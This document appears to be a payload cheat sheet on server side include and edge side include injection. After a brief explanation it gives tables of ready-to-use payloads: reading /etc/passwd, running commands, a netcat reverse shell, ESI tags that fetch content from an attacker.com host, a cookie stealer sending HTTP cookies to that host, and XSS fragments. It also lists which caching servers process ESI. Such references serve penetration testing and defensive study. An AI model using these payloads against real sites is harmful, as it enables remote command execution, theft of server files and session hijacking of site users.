# server side include injection

> server side includes (ssi) are directives that are placed in html pages and evaluated on the server while the pages are being served. they let you add dynamically generated content to an existing html page, without having to serve the entire page via a cgi program, or other dynamic technology.


## summary

* [methodology](#methodology)
* [edge side inclusion](#edge-side-inclusion)
* [references](#references)


## methodology

ssi injection occurs when an attacker can input server side include directives into a web application. ssis are directives that can include files, execute commands, or print environment variables/attributes. if user input is not properly sanitized within an ssi context, this input can be used to manipulate server-side behavior and access sensitive information or execute commands.

ssi format: `<!--#directive param="value" -->`

| description             | payload                                  |
| ----------------------- | ---------------------------------------- |
| print the date          | `<!--#echo var="date_local" -->`         |
| print the document name | `<!--#echo var="document_name" -->`      |
| print all the variables | `<!--#printenv -->`                      |
| setting variables       | `<!--#set var="name" value="rich" -->`   |
| include a file          | `<!--#include file="/etc/passwd" -->`    |
| include a file          | `<!--#include virtual="/index.html" -->` |
| execute commands        | `<!--#exec cmd="ls" -->`                 |
| reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc ip port 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |


## edge side inclusion

http surrogates cannot differentiate between genuine esi tags from the upstream server and malicious ones embedded in the http response. this means that if an attacker manages to inject esi tags into the http response, the surrogate will process and evaluate them without question, assuming they are legitimate tags originating from the upstream server.

some surrogates will require esi handling to be signaled in the surrogate-control http header.

```ps1
surrogate-control: content="esi/1.0"
```

| description             | payload                                  |
| ----------------------- | ---------------------------------------- |
| blind detection         | `<esi:include src=http://attacker.com>`  |
| xss                     | `<esi:include src=http://attacker.com/xsspayload.html>` |
| cookie stealer          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(http_cookie)>` |
| include a file          | `<esi:include src="supersecret.txt">` |
| display debug info      | `<esi:debug/>` |
| add header              | `<!--esi $add_header('location','http://attacker.com') -->` |
| inline fragment         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('xss')</script></esi:inline>` |


| software | includes | vars | cookies | upstream headers required | host whitelist |
| -------- | -------- | ---- | ------- | ------------------------- | -------------- |
| squid3   | yes      | yes  | yes     | yes                       | no             |
| varnish cache	| yes | no   | no      | yes                       | yes            |
| fastly   | yes      | no   | no      | no                        | yes            |
| akamai esi test server (ets) | yes | yes | yes | no              | no             |
| nodejs' esi | yes	  | yes  | yes     | no                        | no             |
| nodejs' nodesi | yes | no  | no      | no                        | optional       |


## references

* [beyond xss: edge side include injection - louis dion-marcil - april 3, 2018](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [def con 26 - edge side include injection abusing caching servers into ssrf - ldionmarcil - october 23, 2018](https://www.youtube.com/watch?v=vuzgznpsg8i)
* [esi injection part 2: abusing specific implementations - philippe arteau - may 2, 2019](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [exploiting server side include injection - n00py - august 15, 2017](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
* [server side inclusion/edge side inclusion injection - hacktricks - july 19, 2024](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
* [server-side includes (ssi) injection - weilin zhong, nsrav - december 4, 2019](https://owasp.org/www-community/attacks/server-side_includes_(ssi)_injection)